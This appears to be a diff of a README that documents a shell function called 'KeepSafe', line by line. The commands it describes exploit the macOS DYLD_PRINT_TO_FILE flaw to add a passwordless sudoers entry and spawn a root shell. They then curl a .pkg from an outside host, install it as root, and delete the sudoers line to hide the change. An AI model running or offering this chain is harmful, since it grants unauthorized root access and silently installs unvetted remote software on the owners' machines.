@@ -35,18 +35,18 @@ This is used to ensure the completion of the command if it fails.
 
 ## IN-DEPTH LOOK AT `function KeepSafe { }` COMMANDS ##
 
-`echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;` - ___Exploit the machine___
+`echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;` ___- Exploit the machine___
 <br>
-`sudo bash -c ` - ___Create a root bash shell___
+`sudo bash -c ` ___- Create a root bash shell___
 <br>
-`if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1);"` - ___Check if the exploit actually worked, if not, exit the script___
+`if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1);"` ___- Check if the exploit actually worked, if not, exit the script___
 <br>
-`sudo mkdir -v /tmp$$;` - ___Make a temporary directory to store the package in___
+`sudo mkdir -v /tmp$$;` ___- Make a temporary directory to store the package in___
 <br>
-`sudo curl -# http://thrifus.co/jump/j8u60.pkg > /tmp$$/j8u60.pkg;` - ___Get the package___
+`sudo curl -# http://thrifus.co/jump/j8u60.pkg > /tmp$$/j8u60.pkg;` ___- Get the package___
 <br>
 `sudo installer -verbose -pkg /tmp$$/j8u60.pkg -target LocalSystem;` - ___Install the package___
 <br>
-`sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;` - ___Remove the line allowing root access without a password___
+`sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;` ___- Remove the line allowing root access without a password___
 <br>
-`rm -rfv /tmp$$;` - ___Remove the temporary directory___
+`rm -rfv /tmp$$;` ___- Remove the temporary directory___
